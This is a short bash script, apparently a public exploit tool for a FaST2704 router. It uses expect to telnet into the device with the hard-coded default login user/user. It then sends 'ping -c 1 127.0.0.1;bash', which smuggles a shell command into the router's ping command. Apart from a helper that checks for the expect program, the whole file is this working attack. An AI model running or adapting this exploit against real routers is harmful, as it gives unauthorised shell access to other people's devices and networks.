#!/bin/bash
#	~Mixbo
#	https://github.com/Mixbo/FaST2704/
#	www.wakowakowako.com

function main()
{
	if haveProg expect; then
	if [ -z "$1" ]
	  then
	    host="192.168.1.1"
	  else
	  	host=$1
	fi

	(expect -c "
		set timeout 20
		spawn telnet $host
		expect \"Login:\"
		send \"user\r\"
		expect \"Password:\"
		send \"user\r\"
		expect \">\"
		send \"ping -c 1 127.0.0.1;bash\n\"
		interact
		exit
	")
	else
		install expect
	fi
}

function haveProg()
{
    [ -x "$(	which $1)" ]
}

function install()
{
	echo "[-] You need to install $1"
	if haveProg apt-get ; then 
		echo "[+] You can install it with:	sudo apt-get install $1"
	elif haveProg yum ; then 
		echo "[+] You can install it with:	sudo yum install $1"
	elif haveProg port ; then 
		echo "[+] You can install it with:	sudo port install $1"
	elif haveProg pacman ; then 
		echo "[+] You can install it with:	sudo pacman -S $1"
	fi

	echo "[+] Closing..."
	exit
}

main $1

